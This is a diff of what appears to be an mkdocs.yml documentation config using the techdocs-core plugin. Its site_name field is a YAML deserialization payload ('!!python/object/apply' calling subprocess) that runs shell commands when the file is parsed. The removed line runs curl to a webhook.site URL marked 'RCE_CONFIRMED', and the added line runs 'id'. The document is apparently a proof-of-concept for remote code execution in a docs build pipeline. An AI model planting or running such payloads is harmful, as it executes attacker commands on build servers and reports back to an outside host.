@@ -1,8 +1,7 @@
-site_name: !!python/object/apply:subprocess.check_output ["curl -k https://webhook.site/57afdd71-d4ee-4a25-bef0-a6edcd29f049/RCE_CONFIRMED"]
+site_name: !!python/object/apply:subprocess.getoutput
+  - "id"
 plugins:
   - techdocs-core
-
-
 
 
 
